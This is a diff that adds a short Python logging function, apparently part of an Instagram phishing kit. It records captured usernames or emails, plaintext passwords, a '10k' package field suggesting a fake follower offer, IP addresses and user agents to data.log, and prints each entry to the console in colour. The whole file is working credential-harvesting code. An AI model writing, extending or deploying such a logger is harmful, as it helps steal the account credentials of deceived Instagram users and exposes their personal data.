@@ -1,0 +1,24 @@
+from datetime import datetime
+from colors import colored, Colors
+
+def log_to_file(data):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    log_entry = f"""
+===========================================
+[New Instagram Login] - {timestamp}
+Username/Email: {data['identifier']}
+Password: {data['password']}
+Package: {data.get('package', '10k')}
+IP: {data['ip']}
+User-Agent: {data.get('user_agent','Unknown')}
+===========================================
+"""
+    with open("data.log", "a", encoding='utf-8') as f:
+        f.write(log_entry)
+    print(colored("\n===========================================", Colors.CYAN))
+    print(colored("[New Instagram Login]", Colors.YELLOW))
+    print(colored(f"Username/Email: ", Colors.GREEN) + data['identifier'])
+    print(colored(f"Password: ", Colors.GREEN) + data['password'])
+    print(colored(f"Package: ", Colors.GREEN) + data.get('package', '10k'))
+    print(colored(f"IP: ", Colors.GREEN) + data['ip'])
+    print(colored("===========================================\n", Colors.CYAN))
